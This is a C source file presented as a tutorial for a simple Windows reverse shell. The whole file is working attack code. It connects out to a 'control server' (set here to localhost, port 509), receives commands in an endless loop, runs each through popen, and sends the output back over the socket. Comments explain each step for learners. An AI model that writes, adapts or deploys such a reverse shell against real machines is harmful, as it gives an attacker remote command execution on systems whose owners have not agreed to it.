/*
    Source Code Tutorial - Simple Reverse Shell in C
*/

// get all our needed libraries ready
#include <stdio.h>
#include <strings.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

// simple function that returns the output file returned from executing `cmd` in the shell
FILE *execcmd(char *cmd)
{
    FILE *fp = popen(cmd, "r");
    return fp;
}

int s_send(s, msg)
{
    return send(s, msg, strlen(msg), 0);
}

int main(int argc , char *argv[])
{
    // simple constants that hold the port and address on which the control server is listening
    const char HOST[] = "127.0.0.1";
    const int PORT = 509;

    // variables for our socket
    WSADATA wsa;
    SOCKET s;

    // `sockaddr_in` is a struct that stores information about our control server
    struct sockaddr_in server;

    int recv_size;

    // stuff for the command we will receive
    const int CMD_SIZE = 2048;
    char cmd[CMD_SIZE];

    // the outputted file from the shell
    FILE *out_fp = NULL;

    // one line of the shell output
    char out[CMD_SIZE];

    // get Winsock ready for use; you don't need to understand this
    printf("\nInitializing Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed: %d", WSAGetLastError());
        WSACleanup();
        return 1;
    } else {
        printf("Initialized.\n");
    }

    // create the Winsock socket
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Could not create socket: %d" , WSAGetLastError());
        return 1;
    }
    printf("Socket created.\n");

    // set the our `server` host, type, and port
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    // connect to the control server
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("Connection error.");
        return 1;
    }

    puts("Connected");

    while(1)
    {
        // receive the control server's command
        if((recv_size = recv(s, cmd, CMD_SIZE, 0)) == SOCKET_ERROR)
        {
            if(s_send(s, "Last input was not received.") < 0)
            {
                puts("Send failed");
                return 1;
            }
        } else {
            // add a NULL terminating character to the end of `cmd` buffer to make it a proper string (won’t print properly without it)
            cmd[recv_size] = '\0';

            puts(cmd);

            // execute the control command in our shell
            out_fp = execcmd(cmd);

            // send each line from the command output to the control server
            while (fgets(out, CMD_SIZE, out_fp) != NULL)
            {
                if(s_send(s, out) < 0)
                {
                    puts("Send failed");
                    return 1;
                }
            }
        }
        pclose(out_fp);
    }

    return 0;
}